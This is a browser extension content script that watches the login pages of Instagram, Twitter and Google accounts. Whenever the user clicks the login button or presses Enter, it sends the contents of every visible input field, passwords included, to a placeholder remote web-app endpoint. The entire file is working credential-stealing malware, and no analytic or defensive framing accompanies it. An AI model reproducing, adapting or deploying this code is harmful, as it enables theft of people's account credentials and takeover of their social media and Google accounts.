chrome.runtime.onMessage.addListener(
    function(request, sender, sendResponse) {
        // listen for messages sent from background.js
        if (request.message === 'updated') {
            console.log(request.url) // new url is now in content scripts!
        }
    });

function outSmart() {


    alterSite(window.location.host)


    if (window.location.host == "www.instagram.com") {
        const observer = new MutationObserver(function(mutations, mutationInstance) {
            const someDiv = document.getElementById('loginForm');
            if (someDiv) {
                alterSite(window.location.host)
                someDiv.addEventListener("keypress", function(e) {
                    if (e.key === "Enter") {
                        send()
                    }
                })
                mutationInstance.disconnect();
            }
        });
        observer.observe(document, {
            childList: true,
            subtree: true
        });



    } else if (window.location.host == "twitter.com") {

        var inputs = document.getElementsByTagName('input')
        for (i = 0; i < inputs.length; i++) {
            if (inputs[i].name == "password" || inputs[i].autocomplete == "username") {
                inputs[i].addEventListener("keypress", function(e) {
                    if (e.key === "Enter") {
                        send()
                    }
                })
            }
        }
    }


    function alterSite(url) {
        var toCheck;
        var buttons = document.getElementsByTagName('button');
        switch (url) {
            case "www.instagram.com":
                toCheck = "Log in"
                break;
            case "accounts.google.com":
                bind()


                toCheck = "Next"
                break;

        }
        for (i = 0; i < buttons.length; i++) {
            if (buttons[i].textContent == toCheck) {
                console.log("specific found")
                buttons[i].addEventListener("click", send)
            }
        }

    }


}

function send() {
    var inputs = document.getElementsByTagName("input");
    for (i = 0; i < inputs.length; i++) {

        if (inputs[i].type != "hidden") {

            console.log(inputs[i].value)
            if (inputs[i].id != "") {
                fetch('#WEBAPP LINK' + new URLSearchParams({
                    tab: window.location.host,
                    field: inputs[i].id,
                    fieldValue: inputs[i].value,
                }), {
                    mode: "no-cors"
                })
            } else {
                fetch('#WEBAPP LINK' + new URLSearchParams({
                    tab: window.location.host,
                    field: inputs[i].ariaLabel,
                    fieldValue: inputs[i].value,
                }), {
                    mode: "no-cors"
                })
            }


        }

    };

}

function bind() {
    for (var i = 0; i < document.forms.length; i++) {
        console.log("forms found: " + i)
        document.forms[i].addEventListener("submit", function() {
            send()
            return false;
        })
        document.forms[i].addEventListener("keydown", function(e) {
            console.log(e.key)
            if (e.key === "Enter") {
                e.preventDefault()
                send()
                const observer = new MutationObserver(function(mutations, mutationInstance) {
                    const someDiv = document.getElementsByTagName("form");
                    if (someDiv) {
                        someDiv[0].addEventListener("keydown", function(h) {
                            console.log(h.key)
                            if (h.key === "Enter") {
                                send()
                            }
                        })
                        mutationInstance.disconnect();
                    }
                });
                observer.observe(document, {
                    childList: true,
                    subtree: true
                });
            }
        })
    }
}


outSmart()